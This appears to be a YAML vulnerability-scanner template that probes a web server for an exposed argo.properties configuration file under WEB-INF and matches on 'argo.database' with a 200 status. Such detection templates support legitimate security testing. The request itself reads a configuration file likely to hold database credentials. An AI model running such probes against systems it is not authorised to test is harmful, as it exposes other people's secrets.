id: Argo-Information-Disclosure

info:
  name: PoC template
  author: Excis3
  severity: High
  description: Testing the template updates
  tags: argo

requests:
  - method: GET
    path:
      - "{{BaseURL}}/WEB-INF/classes/argo.properties"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "argo.database"
          
      - type: status
        status:
          - 200
